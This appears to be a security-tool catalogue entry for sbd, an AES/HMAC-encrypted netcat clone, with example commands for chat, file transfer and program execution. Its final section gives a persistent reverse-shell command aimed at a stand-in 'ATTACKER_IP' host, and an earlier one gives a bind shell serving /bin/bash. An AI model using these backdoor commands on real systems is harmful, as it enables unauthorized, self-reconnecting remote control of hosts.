---
name: "sbd"
categories:
  - blackarch-crypto
version: "1.36"
homepage: "http://www2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=sbd"
packaged-by: [blackarch, kali, aur]
blackarch-builddate: "2018-11-15"
build-system: make
license: GPL
meta-checked: "2026-11-09"
worth: 1.1
worth-basis: "adoption-only (no upstream data)"
worth-checked: "2026-11-09"
---

# sbd

> Encrypted netcat clone — AES-CBC-128 + HMAC-SHA1 authenticated TCP channels with program execution and automatic reconnection, for Unix and Windows.

*No corpus evidence — derived from upstream documentation.*

## What it's for

sbd (Secure BackDoor, by Michel Blomgren, 2004) is a netcat-style TCP tool where everything crossing the wire is encrypted with AES-CBC-128 and authenticated with HMAC-SHA1, keyed by a shared passphrase given with `-k`. Where plain netcat over an untrusted network is readable and spoofable, sbd gives you an encrypted pipe, an encrypted file transfer, or an encrypted remote shell from the same familiar netcat grammar (`sbd host port` to connect, `sbd -l -p port` to listen). It compiles on Unix-like systems and Win32, ships Windows binaries in its source tarball, and adds netcat-plus features: `-e prog` to execute a program after connect, `-r n` to respawn or reconnect on a delay, source-port selection, and chat-style prefixes. It speaks TCP only, and its security rests entirely on the shared secret — there is a passphrase compiled into the binary by default, so always override it with `-k` on both ends. It is not TLS: both sides must use the same sbd-era crypto settings, and turning encryption off with `-c off` makes it behave like plain netcat.

## Typical use cases

### Open an encrypted chat channel between two hosts

```
sbd -l -p 1234 -k 'CorrectHorse' -H on -P alice-
sbd -k 'CorrectHorse' -H on -P bob- 198.51.100.10 1234
```

Outcome: the first command listens on port 1234, the second connects out to it; each line you type is prefixed with your `-P` nickname (`alice-`/`bob-`) and incoming lines are color-highlighted (`-H on`). Everything typed on either side crosses the network AES-encrypted and HMAC-authenticated with the shared passphrase.

### Transfer a file over the encrypted channel

```
sbd -l -p 12345 -k 'CorrectHorse' > output.file
cat input.file | sbd -k 'CorrectHorse' 198.51.100.10 12345
```

Outcome: the listener redirects everything it receives into `output.file`; the sender pipes `input.file` into its outbound connection. The file arrives encrypted on the wire and decrypts transparently — no separate gpg/openssl step needed for the transport.

### Serve a program on a listener

```
sbd -l -p 443 -e /bin/bash -k 'CorrectHorse'
```

Outcome: the next client to connect with `sbd -k 'CorrectHorse' <listener-host> 443` gets an encrypted interactive shell — the executed program's input and output are piped through the encrypted channel instead of raw sockets. Avoid blasting cached bulk input at a listening `-e` session; its pipes can truncate very large writes.

### Reverse shell that keeps reconnecting

```
sbd -e /bin/bash -r 1800 -k 'CorrectHorse' ATTACKER_IP 443
```

Outcome: run on a host that can only reach out (not be reached), this connects to your listener (`sbd -l -p 443 -k 'CorrectHorse'`) and serves a shell over the encrypted channel; when the session dies, `-r 1800` respawns the connection attempt every 1800 seconds, so the channel comes back on its own. On Unix, `-s` invokes a shell directly and `-w n` sets an idle timeout for read/write operations.
